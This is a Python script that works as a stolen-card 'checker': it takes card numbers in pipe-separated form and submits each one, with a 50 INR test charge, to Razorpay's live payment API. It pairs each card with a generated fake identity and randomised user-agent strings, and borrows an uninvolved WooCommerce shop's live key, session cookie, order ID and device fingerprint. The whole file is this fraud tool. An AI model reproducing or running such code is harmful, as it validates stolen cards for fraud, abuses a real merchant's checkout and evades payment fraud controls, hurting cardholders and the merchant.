import requests
import random
import json

def check_razorpay(cc, identity):

	try:

		gate_url = "https://api.razorpay.com/v1/payments/create/ajax"
		gate_user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/{}.{} (KHTML, like Gecko) Chrome/{}.0.{}.{} Safari/{}.{}".format(random.randint(111, 999),
			random.randint(11, 99),
			random.randint(11, 99),
			random.randint(1111, 9999),
			random.randint(111, 999),
			random.randint(111, 999),
			random.randint(11, 99))
		gate_check_amount = "50" # INR

		splitted_card = cc.split('|')

		payment_header = {
			'Host': 'api.razorpay.com',
			'User-agent': gate_user_agent,
			'Connection': 'keep-alive',
			'Accept': '*/*',
			'Accept-Language': 'en-US,en;q=0.5',
			'Content-type': 'application/x-www-form-urlencoded',
			'Origin': 'https://api.razorpay.com',
			'DNT': '1',
			'Referer': 'https://api.razorpay.com/v1/checkout/public',
			'Cookie': 'razorpay_api_session=eyJpdiI6InAxQjlvc1pqWTd0TGEyaHVHZ0lLV2c9PSIsInZhbHVlIjoiNkZZOFVhdHhjbEQrMHZlT0tnbFZIb1ZuYnU5WFlWalJ4dVpPb01oYmxmb2FjV3pxSDNQQnJrV3ZcL0xMQlFPdkp3VytJcXdZWkdFTENrb3RUNytUMG9pR0QxbGRrTEU4YVJEdGdmVkp4ZlI2SXNBQnJ5ZHV1d3BCNnBNMjhGc0hLIiwibWFjIjoiNmEzMDA3MzVkZmJkYWQ1NWNmZmVhZjc3ZGIxM2M3MjkwOTkzMzZiYjliMjhhNmIyNGZhYmM3N2VjYmU3ZjgxMiJ9'
		}
		
		payment_data = 'contact=%2B16564989454&email={}&method=card&card%5Bnumber%5D={}&card%5Bcvv%5D={}&card%5Bname%5D={}%20fhdfh&amount={}&currency_request_id=HZz6JE2JVJEgr4&dcc_currency=USD&currency=INR&description=Order%2025627&order_id=order_HZz5ejX3ZGgczd&key_id=rzp_live_ns4mpiAdGPA9e3&_%5Bintegration%5D=woocommerce&_%5Bintegration_version%5D=2.5.0&_%5Bintegration_parent_version%5D=4.4.2&_%5Bshield%5D%5Bfhash%5D=e7fcabd73825b2e15889e0fccf650f622290a42f&_%5Bdevice_id%5D=1.e7fcabd73825b2e15889e0fccf650f622290a42f.1626521932619.75438571&_%5Bshield%5D%5Btz%5D=330&_%5Bbuild%5D=1034518441&notes%5Bwoocommerce_order_id%5D=25627&card%5Bexpiry_month%5D={}&card%5Bexpiry_year%5D={}&_%5Bcheckout_id%5D=HZz5tZKlN2VIAf&_%5Blibrary%5D=checkoutjs&_%5Bplatform%5D=browser&_%5Breferer%5D=https%3A%2F%2Fplanetfp.org%2Fcheckout%2Forder-pay%2F25627%2F%3Fkey%3Dwc_order_v8IS7SufgLS4n&_%5Brequest_index%5D=1'.format(identity["results"][0]["email"],
			splitted_card[0],
			splitted_card[3],
			identity["results"][0]["name"]["first"],
			gate_check_amount,
			splitted_card[1],
			splitted_card[2])

		payment_request = requests.post(gate_url, 
			headers=payment_header, 
			data=payment_data)

		if payment_request.status_code < 300:

			return payment_request.json()

		else: return False

	except Exception as E: raise E